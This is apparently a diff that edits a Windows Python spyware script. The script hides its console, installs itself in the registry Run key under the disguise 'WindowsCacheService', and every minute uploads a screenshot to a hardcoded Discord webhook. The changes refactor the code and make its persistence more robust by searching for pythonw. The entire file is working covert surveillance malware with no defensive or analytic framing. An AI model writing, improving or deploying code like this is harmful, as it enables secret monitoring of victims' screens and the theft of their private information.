@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 import os
 import sys
 import io
@@ -10,43 +9,53 @@ import urllib.request
 import urllib.error
 import subprocess
 import winreg
-
 try:
     console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
     if console_hwnd:
         ctypes.windll.user32.ShowWindow(console_hwnd, 0)
 except Exception:
     pass
-
 WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
 INTERVAL = 60
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_REG_NAME = "WindowsCacheService"
-
 try:
     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
     if ctypes.windll.kernel32.GetLastError() == 183:
         sys.exit(0)
 except Exception:
     pass
-
+def find_pythonw():
+    current_exe = os.path.abspath(sys.executable).lower()
+    try:
+        result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5, text=True)
+        if result.returncode == 0:
+            for line in result.stdout.strip().split("\n"):
+                p = line.strip()
+                if os.path.isfile(p):
+                    return p
+    except:
+        pass
+    for candidate in [os.path.join(os.path.dirname(sys.executable), "pythonw.exe"),
+                      r"C:\Python313\pythonw.exe",
+                      r"C:\Python312\pythonw.exe",
+                      r"C:\Python311\pythonw.exe",
+                      r"C:\Python310\pythonw.exe"]:
+        if os.path.isfile(candidate):
+            return candidate
+    return sys.executable
 def ensure_persistence():
     try:
         script_path = os.path.abspath(sys.argv[0])
-        python_dir = os.path.dirname(sys.executable)
-        pythonw = os.path.join(python_dir, "pythonw.exe")
-        if not os.path.exists(pythonw):
-            pythonw = sys.executable
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH,
-                             0, winreg.KEY_SET_VALUE)
+        pythonw = find_pythonw()
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
                           f'"{pythonw}" "{script_path}"')
         winreg.CloseKey(key)
         return True
     except Exception:
         return False
-
 def take_screenshot():
     try:
         from PIL import ImageGrab
@@ -71,9 +80,7 @@ def take_screenshot():
         dib_header_size = 40
         stride = ((width * 3 + 3) // 4) * 4
         image_size = stride * height
-        bmp_data = b""
-        bmp_data += b"BM"
-        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size + image_size)
+        bmp_data = b"BM" + struct.pack("<I", bmp_header_size + dib_header_size + image_size)
         bmp_data += struct.pack("<HH", 0, 0)
         bmp_data += struct.pack("<I", bmp_header_size + dib_header_size)
         bmp_data += struct.pack("<I", dib_header_size)
@@ -94,17 +101,17 @@ def take_screenshot():
         return io.BytesIO(bmp_data)
     except Exception:
         return None
-
 def send_screenshot_to_discord(image_buffer):
     try:
         boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
-        body_parts = []
-        body_parts.append(f"--{boundary}".encode())
-        body_parts.append(b'Content-Disposition: form-data; name="file"; filename="screen.png"')
-        body_parts.append(b"Content-Type: image/png")
-        body_parts.append(b"")
-        body_parts.append(image_buffer.getvalue())
-        body_parts.append(f"--{boundary}--".encode())
+        body_parts = [
+            f"--{boundary}".encode(),
+            b'Content-Disposition: form-data; name="file"; filename="screen.png"',
+            b"Content-Type: image/png",
+            b"",
+            image_buffer.getvalue(),
+            f"--{boundary}--".encode(),
+        ]
         body = b"\r\n".join(body_parts)
         headers = {
             "Content-Type": f"multipart/form-data; boundary={boundary}",
@@ -115,7 +122,6 @@ def send_screenshot_to_discord(image_buffer):
             return resp.status == 200
     except Exception:
         return False
-
 def main_loop():
     ensure_persistence()
     while True:
@@ -126,7 +132,6 @@ def main_loop():
         except Exception:
             pass
         time.sleep(INTERVAL)
-
 if __name__ == "__main__":
     try:
         main_loop()
